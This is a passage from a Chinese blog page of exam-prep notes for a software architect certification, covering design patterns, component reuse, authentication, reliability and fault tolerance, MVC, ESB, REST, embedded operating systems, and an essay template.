align="left">将一个请求封装成一个命令对象，这样就可以保存命令，并将命令传递给方法，再由该方法返回该命令</td><td align="left">· 希望通过要执行的动作来参数化对象<br>· 要在不同的时间指定、排序以及执行请求<br>· 必须支持Undo、日志记录或事务</td></tr><tr><td align="center">&nbsp;</td><td align="center">Interpreter（解释器）</td><td align="left">给定一个语言，定义其文法的一种表示，并定义一个解释器，用该表示去解释语言中的句子</td><td align="left">· 语言的语法比较简单<br>· 效率并非最主要的问题</td></tr><tr><td align="center">&nbsp;</td><td align="center">Chain of Responsibility（责任链）</td><td align="left">使多个相关对象连成一条链，并沿着链传递发送者的请求，直到有一个对象处理之</td><td align="left">· 多个对象可以处理一个请求，而处理器却未知<br>· 希望在不确定请求的接收对象的情况下，向多个对象中的一个发送请求<br>· 可以动态指定能够处理请求的对象集</td></tr><tr><td align="center">&nbsp;</td><td align="center">Memento（备忘录）</td><td align="left">保持对象状态的“快照”，使得对象可以在不向外界公开其内容的情况下返回到它的最初状态</td><td align="left">· 必须保存对象状态的快照以便以后恢复状态<br>· 使用直接接口获得状态可能会公开对象的实现细节，从而破坏对象的封装性</td></tr><tr><td align="center">&nbsp;</td><td align="center">State（状态）</td><td align="left">允许对象在内部状态变化时，改变其行为，并修改其类</td><td align="left">· 操作具有大量以及多部分组成的取决于对象状态的条件语句</td></tr><tr><td align="center">&nbsp;</td><td align="center">Strategy（策略）</td><td align="left">定义一系列的封装好的算法，让它们可以相互替代，且算法的变化可以独立于使用它们的用户</td><td align="left">· 相关类只在行为方面有所区别<br>· 需要算法的不同变体<br>· 算法使用客户端未知的数据</td></tr><tr><td align="center">&nbsp;</td><td align="center">Observer（观察者）</td><td align="left">定义了对象间一到多的依赖关系，这样当对象改变状态时，将自动通知并更新它所有依赖的对象</td><td align="left">· 对一个对象的修改涉及到对其他对象的修改，且不知道有多少对象需要进行相应的修改<br>· 对象在不用假设对象标识的前提下通知其他对象</td></tr><tr><td align="center">&nbsp;</td><td align="center">Iterator（迭代）</td><td align="left">提供一种方法顺序访问一个聚合对象中的各个元素，而又不暴露该对象的内部表示</td><td align="left">· 不开放集合对象内部表示的前提下访问其内容<br>· 支持集合对象的多重遍历<br>· 为遍历集合中的不同结构提供了统一的接口</td></tr><tr><td align="center">&nbsp;</td><td align="center">Visitor（访问者）</td><td align="left">不改变原来类结构（固定结构）的基础上增加新的功能</td><td align="left">· 对象结构包含许多具有不同接口的对象类，并且需要对这些依赖于具体类的对象进行操作<br>· 定义对象结构的类很少被修改，但希望在此结构上定义新操作</td></tr><tr><td align="center">&nbsp;</td><td align="center">Mediator（中介者）</td><td align="left">用一个中介对象来封装一系列对象的交互，使各对象不需显式地相互引用，从而使其耦合松散，而且可以独立改变对象间的交互</td><td align="left">· 对象集合需以一个定义规范但复杂的方式通信<br>· 希望在不使用子类的情况下自定义分布在几个对象之间的行为</td></tr></tbody></table><h3 id="获取构件的方法（P247）"><a href="#获取构件的方法（P247）" class="headerlink" title="获取构件的方法（P247）"></a>获取构件的方法（P247）</h3><ul><li>从现有构件中获得符合要求的构件，直接使用或作适应性的修改，得到可重用的构件。</li><li>通过遗留工程，将具有潜在重用价值的构件提取出来，得到可重用的构件。</li><li>从市场上购买现成的商业构件，即COTS（Commercial Off-The-Shell）构件。</li><li>开发新的符合要求的构件。</li></ul><h3 id="开发构件的策略（P267）"><a href="#开发构件的策略（P267）" class="headerlink" title="开发构件的策略（P267）"></a>开发构件的策略（P267）</h3><ul><li>修改已有构件，产生新构件。</li><li>全新开发新构件。</li></ul><h3 id="构件组装（P271）"><a href="#构件组装（P271）" class="headerlink" title="构件组装（P271）"></a>构件组装（P271）</h3><p>将构件库中的构件经适当修改后互相连接，或将它们与当前开发项目中的软件元素相连接，最终构成新的目标软件。构件组装技术大致可以分为三种：</p><ul><li><strong>基于功能的组装技术</strong><br>　　采用子程序调用和参数传递的方式将构件组装起来。它要求库中的构件以子程序/过程/函数的形式出现，并且接口说明必须清晰。开发人员使用此组装技术时，需先对目标软件系统分解成强内聚、松耦合的功能模块，再根据各模块功能提取构件，进行适应性修改后挂接到功能分解框架中。</li><li><strong>基于数据的组装技术</strong><br>　　根据当前软件问题的核心数据结构设计出一个框架，再根据框架中各结点的需求提取构件并进行适应性修改，最后把构件逐个分配到框架中的适当位置。这种组装方式也要求构件以子程序形式出现，但依赖的软件设计方法不是功能分解，而是面向数据的设计方法。</li><li><strong>面向对象的组装技术</strong><br>　　如果从类库中检索出来的基类能够完全满足新软件项目的需求，则直接使用；否则必须以类库中的基类为父类，采用构造法或子类法生成子类。由于封装和继承特性，该技术更适合支持软件重用。</li></ul><h3 id="主流构件标准（P275）"><a href="#主流构件标准（P275）" class="headerlink" title="主流构件标准（P275）"></a>主流构件标准（P275）</h3><p>CORBA、COM/DCOM/COM+、EJB</p><h3 id="主要的身份认证技术（P315）"><a href="#主要的身份认证技术（P315）" class="headerlink" title="主要的身份认证技术（P315）"></a>主要的身份认证技术（P315）</h3><ul><li><strong>用户名和口令认证</strong>：主要是通过一个客户端和服务器共知的口令（或与口令相关的数据）进行验证。根据处理形式的不同，分为直接通过明文传送验证数据、利用单向散列函数处理验证数据、利用单向散列函数和随机数处理验证数据。</li><li><strong>令牌认证</strong>：该方式中，进行验证的密钥存储于令牌中。目前的令牌包括安全认证书和智能卡等。</li><li><strong>生物识别认证</strong>：主要是根据认证者的图像、指纹、气味和声音等作为认证数据。</li></ul><h3 id="授权侵犯"><a href="#授权侵犯" class="headerlink" title="授权侵犯"></a>授权侵犯</h3><p>指被授权以某一目的使用某一系统或资源的某人，将此权限用于其他非授权的目的，也称“内部攻击”。</p><h3 id="抗抵赖框架"><a href="#抗抵赖框架" class="headerlink" title="抗抵赖框架"></a>抗抵赖框架</h3><ul><li><strong>内容</strong>：框架中的抗抵赖服务包括证据的生成、验证和记录，以及在解决纠纷时随即进行的数据恢复和再次验证。</li><li><strong>目的</strong>：提供有关特定事件或行为的证据。</li></ul><p>如必须确认数据原发送者和接受者的身份和数据完整性，在某些情况下，可能需要涉及上下文关系的证据（如日期、事件、原发者/接受者的地点等）。</p><h3 id="基于口令的简单认证机制-与-基于公钥体系的认证机制-优缺点比较"><a href="#基于口令的简单认证机制-与-基于公钥体系的认证机制-优缺点比较" class="headerlink" title="基于口令的简单认证机制 与 基于公钥体系的认证机制 优缺点比较"></a>基于口令的简单认证机制 与 基于公钥体系的认证机制 优缺点比较</h3><ul><li>口令认证方式实现简单，但由于口令复杂度及管理方面等原因，易收到认证攻击。而在公钥认证方式中，由于其密钥机制的复杂性，同时在认证过程中私钥不在网络上传输，因此可以有效防止认证攻击，与口令认证方式相比更安全。</li><li>口令的认证方式中，用户口令为用户与服务器共享，没有用户独有的直接秘密信息。而在公钥认证方式中，可基于用户私钥对私有数据进行加密保护。</li><li>公钥认证方式，其协议和计算的复杂度要高于口令认证方式，同时由于管理复杂、认证效率低，其使用环境的用户数不宜过多。</li></ul><h3 id="对称加密策略"><a href="#对称加密策略" class="headerlink" title="对称加密策略"></a>对称加密策略</h3><ul><li><strong>机密性</strong>：发送者利用对称密钥对要发送的数据进行加密，只有拥有正确相同密钥的接收者才能将数据正确解密，从而提供机密性。</li><li><strong>完整性</strong>：发送者根据要发送的数据生成消息认证码（或消息摘要），利用对称密钥对消息认证码进行加密并附加到数据上发送；接收者使用相同密钥将对方发送的消息认证码解密，并根据接收到的数据重新生成消息认证码，比较两个认证码是否相同以验证数据的完整性。</li></ul><h3 id="公钥加密策略"><a href="#公钥加密策略" class="headerlink" title="公钥加密策略"></a>公钥加密策略</h3><ul><li><strong>机密性</strong>：发送者利用接收者的公钥对要发送的数据进行加密，只有拥有对应私钥的接收者才能将数据正确解密，从而提供机密性。</li><li><strong>完整性</strong>：发送者根据要发送的数据生成消息认证码（或消息摘要），利用自己的私钥对消息认证码进行加密并附加到数据上发送；接收者利用对方的公钥将对方发送的消息认证码解密，并根据接收到的数据重新生成消息认证码，比较两个认证码是否相同以验证数据的完整性。</li></ul><h3 id="软件可靠性的定量描述（P355）"><a href="#软件可靠性的定量描述（P355）" class="headerlink" title="软件可靠性的定量描述（P355）"></a>软件可靠性的定量描述（P355）</h3><ul><li><strong>规定时间</strong><br>　　自然时间：即日历时间，指日常计时用的年、月、日等自然流逝的时间段。<br>　　运行时间：指软件从启动开始，到运行结束的时间段。<br>　　执行时间（最准）：指软件运行过程中，CPU执行程序指令所用的时间总和。</li><li><strong>失效概率</strong><br>　　F(t)表示软件运行时失效的随机函数，在时间域(0,+∞)单调递增，F(0)=0，F(+∞)=1</li><li><strong>可靠度</strong><br>　　系统软件在规定的条件下、规定的时间内不会发生失效的概率。R(t)=1-F(t)</li><li><strong>失效强度</strong><br>　　单位时间软件系统出现失效的概率。f(t)=F’(t)</li><li><strong>失效率</strong><br>　　又称风险系数，或条件失效强度。<br>　　是指在运行至此软件系统未出现失效的情况下，单位时间软件系统出现失效的概率： λ(t) = R’(t) / R(t)</li><li><strong>可靠度与失效率之间的换算</strong><br>　　当可靠度 R(t)&gt;0.95 时，λ(t)= (1-R(t)) / t</li><li><strong>平均无失效时间</strong><br>　　软件运行后，到下一次出现失效的平均时间。</li></ul><h3 id="可靠性设计技术（P377）"><a href="#可靠性设计技术（P377）" class="headerlink" title="可靠性设计技术（P377）"></a>可靠性设计技术（P377）</h3><ul><li><strong>容错设计技术</strong>：用于软件失效后果特别严重的场合。</li><li><strong>检错技术</strong>：在软件出现故障后能及时发现并报警，提醒维护人员处理。</li><li><strong>降低复杂度设计</strong>：在保证软件功能的基础上，降低软件复杂度（简化结构、缩短代码长度、优化数据流等），从而提高软件可靠性。</li></ul><h3 id="容错设计技术（P377）"><a href="#容错设计技术（P377）" class="headerlink" title="容错设计技术（P377）"></a>容错设计技术（P377）</h3><p>恢复块设计、N版本程序设计、冗余技术</p><h3 id="恢复块设计（P377）"><a href="#恢复块设计（P377）" class="headerlink" title="恢复块设计（P377）"></a>恢复块设计（P377）</h3><p>是一种动态故障屏蔽技术。一个恢复块包含有若干个功能相同、设计差异的程序块文本，每一时刻有一个文本处于运行状态。一旦该文本出现故障，则用备份文本加以替代，从而构成“动态冗余”。</p><h3 id="N版本程序设计（P377）"><a href="#N版本程序设计（P377）" class="headerlink" title="N版本程序设计（P377）"></a>N版本程序设计（P377）</h3><p>是一种静态故障屏蔽技术，其设计思路是用N个具有相同功能的程序同时执行一项计算，结果通过多数表决来选择。其中N个版本的程序必须由不同的人独立设计，使用不同的方法、设计语言、开发环境和工具来实现。目的是减少N版本程序在表决点上相关错误的概率。</p><h3 id="冗余技术（P377）"><a href="#冗余技术（P377）" class="headerlink" title="冗余技术（P377）"></a>冗余技术（P377）</h3><p>实现容错计算的主要手段是冗余。</p><table><thead><tr><th align="center">冗余技术</th><th align="center">分类</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center">结构冗余<br>（硬件冗余）</td><td align="center">静态冗余</td><td align="left">通过表决和比较来屏蔽系统中出现的错误</td></tr><tr><td align="center">&nbsp;</td><td align="center">动态冗余</td><td align="left">多重模块待机储备，相继运行，以维持系统的正常工作（冷备、热备系统）</td></tr><tr><td align="center">&nbsp;</td><td align="center">混合冗余</td><td align="left">静态冗余和动态冗余的综合，效果最好，成本很高，仅用于可靠性要求极高的情况</td></tr><tr><td align="center">信息冗余</td><td align="center">&nbsp;</td><td align="left">在实现正常功能所需的信息外，再添加一些额外信息，以保证运行结果的正确性</td></tr><tr><td align="center">时间冗余</td><td align="center">&nbsp;</td><td align="left">以降低系统运行速度为代价，减少硬件冗余和信息冗余的开销，以达到可靠性的目的</td></tr><tr><td align="center">冗余附加技术</td><td align="center">&nbsp;</td><td align="left">指为实现上述冗余技术所需的资源和技术</td></tr></tbody></table><h3 id="动态冗余（P378）"><a href="#动态冗余（P378）" class="headerlink" title="动态冗余（P378）"></a>动态冗余（P378）</h3><p>又称主动冗余，它是通过故障检测、故障定位及故障恢复等手段达到容错的目的，其主要方式是多重模块待机储备，当系统检测到某工作模块出现错误时，就用一个备用模块代替它并重新运行。</p><p>各备用模块在其待机时，可与主模块一样工作，也可以不工作。前者叫热备份系统（双重系统），后者叫冷备份系统（双工系统、双份系统）。</p><h3 id="检错技术优缺点（P378）"><a href="#检错技术优缺点（P378）" class="headerlink" title="检错技术优缺点（P378）"></a>检错技术优缺点（P378）</h3><ul><li><strong>优点</strong>：实现代价一般低于容错技术和冗余技术。</li><li><strong>缺点</strong>：不能自动解决故障，出现故障后如果不进行人工干预，最终将导致系统不能正常运行。</li></ul><h3 id="检错设计技术要素（P378）"><a href="#检错设计技术要素（P378）" class="headerlink" title="检错设计技术要素（P378）"></a>检错设计技术要素（P378）</h3><ul><li><strong>检测对象</strong><br>　　① 检测点：容易出错的地方和出错对软件系统影响较大的地方。<br>　　② 检测内容：有代表性的、易于判断的指标。</li><li><strong>检测延时</strong><br>　　从软件发生故障到被自检出来的延时时间。若延时过长，甚至影响故障的及时报警，则需更换检测对象或检测方式。</li><li><strong>实现方式</strong><br>　　① 判断返回结果：如果返回结果超出正常范围，则进行异常处理。<br>　　② 计算运行时间：如果某个模块或函数运行时间超过预期时间，可以判断出现故障。<br>　　③ 置状态标志位：</li><li><strong>处理方式</strong><br>　　大多数都采用“查出故障-停止软件运行-报警”的处理方式。<br>　　但根据故障的不同情况，也可以不停止软件运行，这一般由故障是否需要实时处理决定。</li></ul><h3 id="FMEA失效模式与效应分析（P379）"><a href="#FMEA失效模式与效应分析（P379）" class="headerlink" title="FMEA失效模式与效应分析（P379）"></a>FMEA失效模式与效应分析（P379）</h3><p>FMEA是FMA（故障模型分析）和FEA（故障影响分析）的组合，它对系统各种可能的风险进行评价、分析后，在现有技术的基础上消除这些风险，或将这些风险降低到可接受的水平。</p><h3 id="FMEA主要活动"><a href="#FMEA主要活动" class="headerlink" title="FMEA主要活动"></a>FMEA主要活动</h3><ul><li>找出产品/过程中潜在的故障模式</li><li>根据相应的评价体系对 [所找出的潜在故障模式] 进行风险量化评估</li><li>列出故障起因/机理，寻找预防或改进措施。</li></ul><h3 id="FMEA分类"><a href="#FMEA分类" class="headerlink" title="FMEA分类"></a>FMEA分类</h3><p>由于产品故障可能与设计、制造过程、使用、承包商/供应商的服务有关，因此FMEA又分为：</p><p>设计FMEA、过程FMEA、使用FMEA、服务FMEA</p><h3 id="ODP分布式数据架构（P382）"><a href="#ODP分布式数据架构（P382）" class="headerlink" title="ODP分布式数据架构（P382）"></a>ODP分布式数据架构（P382）</h3><p>由多个计算机系统上的多个局部数据库系统构成，数据可以在这些数据库中进行传送，并接受不同的DBMS的管理。同时，安装了这些系统的机器分布在不同的地理位置，并通过多种通信网络连接在一起，使得企业数据可以分布在不同的计算机上，而一个应用程序则可以操作位于不同地理位置的机器上的数据。</p><h3 id="集中式数据架构"><a href="#集中式数据架构" class="headerlink" title="集中式数据架构"></a>集中式数据架构</h3><p>集中式数据架构，是由一个处理器、与它相关联的数据存储设备以及其他外围设备组成，它被物理地定义到单个位置。</p><p>根据系统提供的数据处理能力，用户可以在同样的站点上操作，也可以在地理位置隔开的其他站点上通过远程终端来操作。系统及其数据管理被某个站点或中心站点集中控制。</p><h3 id="集中式和分布式数据架构的扩展方式"><a href="#集中式和分布式数据架构的扩展方式" class="headerlink" title="集中式和分布式数据架构的扩展方式"></a>集中式和分布式数据架构的扩展方式</h3><ul><li><strong>集中式</strong><br>　　通过向上扩展提升系统的可扩展性。<br>　　具体的实现方式包括硬件扩容（增加CPU数量、内存容量、磁盘数量等）和硬件升级（更换为高端主机或高速磁盘等）。</li><li><strong>分布式</strong><br>　　通过向外扩展提升系统的可扩展性。<br>　　具体的实现方式包括数据复制、数据垂直切分/水平切分、缓存和全文搜索。</li></ul><h3 id="开放式架构的基本特点"><a href="#开放式架构的基本特点" class="headerlink" title="开放式架构的基本特点"></a>开放式架构的基本特点</h3><ul><li><strong>可移植性</strong>：各种计算机应用系统可在具有开放式架构特性的各种计算机系统中进行移植，不论这些计算机是否为同种型号、同种机型。</li><li><strong>可互操作性</strong>：若计算机网络中的各节点机都具有开放架构的特性，则该网络上各节点机间可相互操作和资源共享。</li><li><strong>可剪裁性</strong>：若某计算机系统具有开放性架构特性，则在该系统的低档机上运行的应用系统应能在高档机上运行，原在高档机上运行的应用系统经过裁剪后也可在低档机上运行。</li><li><strong>易获得性</strong>：在具有开放架构特性的机器上所运行的软件环境易于从多方获得，不受某个来源控制。</li></ul><h3 id="MVC架构风格（P419）"><a href="#MVC架构风格（P419）" class="headerlink" title="MVC架构风格（P419）"></a>MVC架构风格（P419）</h3><p>通过把业务逻辑、数据、界面显示进行分离的代码组织方法。它将业务逻辑聚集到一个部件中，在个性化定制界面以及改进用户交互的同时，不需要重新编写业务逻辑。</p><p>MVC架构把整个软件系统划分为模型（M）、视图（V）和控制器（C）三个部分，其中：</p><ul><li>模型：负责维护并保存具有持久性的业务数据，实现业务处理功能，并将业务数据的变化情况及时通知视图。</li><li>视图：负责呈现模型中包含的业务数据，响应模型变化通知，更新呈现形式，并向控制器传递用户的界面操作。</li><li>控制器：负责将用户的界面动作映射为模型中的业务处理功能并实际调用之，然后根据模型返回的业务处理结果选择新的视图。</li></ul><h3 id="MVC设计模式-示例图（P419）"><a href="#MVC设计模式-示例图（P419）" class="headerlink" title="MVC设计模式-示例图（P419）"></a>MVC设计模式-示例图（P419）</h3><p>P419</p><h3 id="MVC模式的优点（P420）"><a href="#MVC模式的优点（P420）" class="headerlink" title="MVC模式的优点（P420）"></a>MVC模式的优点（P420）</h3><ul><li>允许多种用户界面的扩展：新增界面只需改动对应的视图和控制器，模型无需变动。</li><li>易于维护：模型在扩展时若保持接口不变，则控制器和视图无需变动。</li><li>功能强大的用户界面：程序使用更清晰，界面发布更友好。</li></ul><h3 id="从设计模式角度描述用XML作为GUI描述语言的机制（P421）"><a href="#从设计模式角度描述用XML作为GUI描述语言的机制（P421）" class="headerlink" title="从设计模式角度描述用XML作为GUI描述语言的机制（P421）"></a>从设计模式角度描述用XML作为GUI描述语言的机制（P421）</h3><p>从设计模式的角度来说，整个XML表现层解析的机制是一种策略模式。</p><p>在调用显示GUI时，不是直接地调用特定表现技术的API，而是装载GUI对应的XML配置文件，然后根据特定的表现技术解析器解析XML，得到GUI视图实例对象。</p><p>这样，对GUI开发人员来说，GUI视图只需要维护一套XML文件即可。</p><h3 id="基于XML的界面管理技术（P422）"><a href="#基于XML的界面管理技术（P422）" class="headerlink" title="基于XML的界面管理技术（P422）"></a>基于XML的界面管理技术（P422）</h3><p>基于XML的界面管理技术可实现灵活的 界面配置、界面定制 和 界面动态生成。</p><ul><li><strong>界面配置</strong>：是对用户对界面的静态定义，通过读取配置文件的初始值对界面配置。由界面配置对软件功能进行裁剪、重组和扩充，以实现特殊需求。</li><li><strong>界面定制</strong>：是对用户界面的动态修改过程。在软件运行过程中，用户可按需求和使用习惯，对界面元素的属性进行修改。软件运行结束时，界面定制的结果被保存。</li><li><strong>动态生成界面</strong>：系统通过DOM API读取XML配置文件的表示层信息，通过数据存取类读取数据库中的数据层信息，运行时由界面元素动态生成界面。界面配置和定制模块在软件运行前后修改配置文件、更改界面内容。</li></ul><h3 id="基于XML的界面管理技术框架-示例图（P423）"><a href="#基于XML的界面管理技术框架-示例图（P423）" class="headerlink" title="基于XML的界面管理技术框架-示例图（P423）"></a>基于XML的界面管理技术框架-示例图（P423）</h3><p>P423</p><h3 id="TLS三层栈软件总体架构特点"><a href="#TLS三层栈软件总体架构特点" class="headerlink" title="TLS三层栈软件总体架构特点"></a>TLS三层栈软件总体架构特点</h3><blockquote><p>应用层（AL）、操作系统层（OSL）、模块支持层（MSL） -&gt; 硬件平台</p></blockquote><ul><li>应用软件与操作系统服务相关，不直接操作硬件</li><li>操作系统通过模块支持层访问硬件，可与具体硬件无关</li><li>模块支持层将硬件抽象成标准操作</li><li>通过三层栈的划分可实现硬件的快速更改与升级，应用软件的升级不会引起硬件的变更</li></ul><h3 id="嵌入式操作系统VxWorks与Linux的差异（P505）"><a href="#嵌入式操作系统VxWorks与Linux的差异（P505）" class="headerlink" title="嵌入式操作系统VxWorks与Linux的差异（P505）"></a>嵌入式操作系统VxWorks与Linux的差异（P505）</h3><table><thead><tr><th align="center">比较类型</th><th align="left">VxWorks</th><th align="left">Linux</th></tr></thead><tbody><tr><td align="center">工作方式</td><td align="left">操作系统与应用程序处于同一的存储空间</td><td align="left">操作系统与应用程序处于不同的存储空间</td></tr><tr><td align="center">多任务支持</td><td align="left">支持多任务（线程）操作</td><td align="left">支持多进程、多线程操作</td></tr><tr><td align="center">实时性</td><td align="left">硬实时系统</td><td align="left">实时系统</td></tr><tr><td align="center">安全性</td><td align="left">任务间无隔离保护</td><td align="left">支持进程间隔隔离保护</td></tr><tr><td align="center">标准API</td><td align="left">支持</td><td align="left">支持</td></tr></tbody></table><h3 id="Linux操作系统特点"><a href="#Linux操作系统特点" class="headerlink" title="Linux操作系统特点"></a>Linux操作系统特点</h3><ul><li>Linux是一种安全性较强的操作系统。其内核工作在系统态，应用软件工作在用户态，可以有效防止应用软件对操作系统的破坏。</li><li>Linux系统调度的最小单位是线程，线程归属于进程，进程具有自己的独立资源。进程通过MMU实现多功能应用间隔离。</li><li>Linux系统支持硬件抽象，可以有效实现TLS结构，并将硬件抽象与操作系统分离，便于实现硬件的外场快速更换。</li></ul><h3 id="嵌入式操作系统故障类型"><a href="#嵌入式操作系统故障类型" class="headerlink" title="嵌入式操作系统故障类型"></a>嵌入式操作系统故障类型</h3><ul><li>硬件故障：如CPU、存储器和定时器等</li><li>应用软件故障：如数值越界、异常和超时等</li><li>操作系统故障：如越权访问、死锁和资源枯竭等。</li></ul><h3 id="嵌入式操作系统故障滤波算法"><a href="#嵌入式操作系统故障滤波算法" class="headerlink" title="嵌入式操作系统故障滤波算法"></a>嵌入式操作系统故障滤波算法</h3><p>门限算法、递减算法、递增算法、周期滤波算法</p><h3 id="嵌入式操作系统容错算法"><a href="#嵌入式操作系统容错算法" class="headerlink" title="嵌入式操作系统容错算法"></a>嵌入式操作系统容错算法</h3><p>N+1备份、冷备、温备、热备</p><h3 id="基于VME总线机载和基于FC总线机载的嵌入式系统架构比较"><a href="#基于VME总线机载和基于FC总线机载的嵌入式系统架构比较" class="headerlink" title="基于VME总线机载和基于FC总线机载的嵌入式系统架构比较"></a>基于VME总线机载和基于FC总线机载的嵌入式系统架构比较</h3><ul><li>VME总线采用存储映射方式、多主机仲裁机制，仲裁方式为菊花链方式（串行仲裁），同一时刻仅由单一主机控制，导致任务执行时延大，限制了可扩展性，实时性差，带宽低。</li><li>FC总线采用消息包交换机制，支持广播和组播，任务并发性好，传输距离远，误码率低，且允许在同一接口上传输多种不同的协议，可扩展性好，可靠性高，实时性好，带宽高。</li></ul><h3 id="ESB企业服务总线（P537）"><a href="#ESB企业服务总线（P537）" class="headerlink" title="ESB企业服务总线（P537）"></a>ESB企业服务总线（P537）</h3><p>企业服务总线是由中间件技术实现的面向服务架构的基础软件平台，支持异构环境中的服务以基于消息和事件驱动模型式的交互，并且具有适当的服务质量和可管理性。</p><h3 id="ESB主要功能（P538）"><a href="#ESB主要功能（P538）" class="headerlink" title="ESB主要功能（P538）"></a>ESB主要功能（P538）</h3><ul><li>提供位置透明的消息路由和寻址服务（服务位置透明性）</li><li>提供服务注册和命名管理功能</li><li>支持多种消息传递范型（如请求/响应、发布/订阅等）</li><li>支持多种可以广泛使用的传输协议（传输协议转换）</li><li>支持多种数据格式及其相互转换（消息格式转换）</li><li>提供日志和监控功能（监控与管理）</li><li>消息增强支持</li><li>安全性支持</li></ul><h3 id="ESB作为集成框架的优点"><a href="#ESB作为集成框架的优点" class="headerlink" title="ESB作为集成框架的优点"></a>ESB作为集成框架的优点</h3><ul><li>能够实现灵活的部署结构，包括CS结构、P2P结构等</li><li>待集成系统只需和总线进行联系，彼此间无需相互通信，大大降低了系统的耦合程度</li><li>在加入新的集成系统时，只需采用插件的方式实现传输协议和数据格式适配即可，系统的可扩展性较强。</li></ul><h3 id="项目计划应包含的内容"><a href="#项目计划应包含的内容" class="headerlink" title="项目计划应包含的内容"></a>项目计划应包含的内容</h3><ul><li>项目背景</li><li>项目经理及其主管领导、客户方及其主管领导、项目管理团队、项目实施团队</li><li>项目总体技术解决方案</li><li>项目的管理过程及执行水平</li><li>项目过程的工具、技术和输入输出的描述</li><li>项目的生命周期和相关的项目阶段</li><li>项目的最终目标和阶段性目标</li><li>进度计划</li><li>项目预算</li><li>变更流程和变更控制委员会</li><li>对于内容、范围和事件的关键管理评审，以便于确定悬留问题和未决决策</li></ul><h3 id="缩短项目工期的方式"><a href="#缩短项目工期的方式" class="headerlink" title="缩短项目工期的方式"></a>缩短项目工期的方式</h3><ul><li><strong>快速跟进</strong><br>　　通过对项目各阶段的逻辑关系进行并行调整来缩短项目周期。<br>　　它是在当风险不大时，通过精心安排而使项目的前后阶段相互搭接，以加快项目进展的做法。<br>　　快速跟进只是将部分工作提前开始，所以不会明显增加成本。</li><li><strong>赶工</strong><br>　　对成本和进度进行权衡，确定如何在尽量少地增加费用的前提下最大限度地缩短项目所需的时间。</li></ul><h3 id="REST表现层状态转换技术"><a href="#REST表现层状态转换技术" class="headerlink" title="REST表现层状态转换技术"></a>REST表现层状态转换技术</h3><p>REST从资源的角度来定义整个网络系统结构，分布在各处的资源由统一资源标识符URI确定，客户端应用程序通过URI获取资源的表现，并通过获得资源的表现使其状态发生改变。</p><p>REST中将 [资源] 、 [资源的表现] 和 [获取资源的动作] 三者进行分离。</p><p>REST是一种只使用HTTP和XML的基于WEB通信的技术，它可以降低开发的复杂性，提高系统的可伸缩性。而其简单性和缺少严格配置文件的特性将其与SOAP很好地隔离开来。从根本上说，REST只支持几个操作（POST、GET、PUT、DELETE），而这些操作适用于所有消息。</p><h3 id="REST设计原则"><a href="#REST设计原则" class="headerlink" title="REST设计原则"></a>REST设计原则</h3><ul><li>网络上所有事物都被抽象为资源</li><li>每个资源对应一个唯一的资源标识</li><li>通过通用的连接件接口对资源进行操作</li><li>对资源的各种操作不会改变资源的标识</li><li>所有的操作都是无状态的</li></ul><h3 id="XACML（可扩展访问控制标记语言）相对于MAC（强制访问控制）的优点"><a href="#XACML（可扩展访问控制标记语言）相对于MAC（强制访问控制）的优点" class="headerlink" title="XACML（可扩展访问控制标记语言）相对于MAC（强制访问控制）的优点"></a>XACML（可扩展访问控制标记语言）相对于MAC（强制访问控制）的优点</h3><ul><li>授权的可管理性：RBAC（基于角色的控制访问）将用户与权限分离，与MAC相比，减少了授权管理的复杂性，更适合于大型企业级系统的安全管理。</li><li>细粒度访问控制的支持：XACML提供了统一的访问控制策略描述语言，策略表达能力强，可以用来描述各种复杂的和细粒度的访问控制安全需求，更适合企业复杂业务功能的访问控制要求。</li><li>分布式环境的支持：XACML的标准性便于各子系统的协作交互，各子系统或企业业务部门可以分部管理访问控制权限；而MAC则通常需要对访问控制权限集中管理，不太适合企业基于SOA集成后的分布式系统。</li></ul><hr><h2 id="论文题"><a href="#论文题" class="headerlink" title="论文题"></a>论文题</h2><h3 id="论文通用题型"><a href="#论文通用题型" class="headerlink" title="论文通用题型"></a>论文通用题型</h3><ul><li>概要叙述你参与管理和开发的软件项目，以及你在其中承担的主要工作</li><li>分析【XXX】的主要技术/手段/内容，并说明选择【XXX】的原因。</li><li>结合具体参与管理和开发的实际项目，举例说明【XXX】的具体实施过程，并详细分析实施效果。</li></ul><blockquote><p>注意：选好题型后，不要忘记<font color="red">在答题纸上画圈和填写考号</font>！！！</p></blockquote><h3 id="论文评分点"><a href="#论文评分点" class="headerlink" title="论文评分点"></a>论文评分点</h3><ul><li>切题：30%</li><li>引用与水平深度：20%</li><li>实践性：20%</li><li>表达方式：15%</li><li>综合能力与分析能力：15%</li><li><font color="red">字迹：100%</font></li></ul><table><thead><tr><th align="center">加分点</th><th align="left">扣分点</th></tr></thead><tbody><tr><td align="center">有独特见解，体会深刻、突出</td><td align="left">字迹潦草，难以辨认</td></tr><tr><td align="center">符合当今信息系统发展的新趋势、新动向，并加以利用</td><td align="left">自我吹嘘、自我标榜、夸大其词</td></tr><tr><td align="center">内容详实，思路清晰，符合提议</td><td align="left">通篇理论或内容空洞，泛泛而谈</td></tr></tbody></table><h3 id="论文模板"><a href="#论文模板" class="headerlink" title="论文模板"></a>论文模板</h3><p><font color="red">摘要：（300-400字，先摘要，再正文，占分5-10）</font></p><p>y年m月，根据 xxx <font color="blue">（项目背景）</font> 的需求，我所在的 xxx <font color="blue">（公司、团队）</font>组织了 xxx <font color="blue">（项目名称）</font>项目的开发。该项目 yyy <font color="blue">（简单项目介绍，功能模块等）</font>。在该项目中，我担任了 ??? <font color="blue">（项目角色）</font>。通过采取 zzz<font color="blue">（论文主题，包括相关的技术、方法、工具、措施）</font>，使项目得以实施完成，并正稳定地投入使用。但其实，该项目除了 aaa <font color="blue">（特色之处、发展趋势）</font>，其实还存在 bbb <font color="blue">（不足之处、如何改进）</font>。</p><p><font color="red">正文：（2000-3000字，先立纲，再下笔，思维导图）</font></p><p>　1. 项目概述<font color="blue">（400-600字，切忌照抄摘要）</font>：<br>　　1.1. 开发项目概述<br>　　1.2. 我承担的角色和工作<br>　　1.3. 项目的架构情况概述</p><p>　2. 采用的技术，为什么<font color="blue">（1000-1400字，直奔论文主题，可以图文并茂，分点论述，但层次不宜太深）</font></p><p>　3. 技术的效果<font color="blue">（200-300字，佐证论点的好处）</font></p><p>　4. 不足之处和改进方案<font color="blue">（200-300字，万事不尽美，报喜不报忧会很假）</font></p><p>　5. 总结<font color="blue">（100-200字，心得，我学到了什么，可以合并到第4点）</font></p><h3 id="示例论文"><a href="#示例论文" class="headerlink" 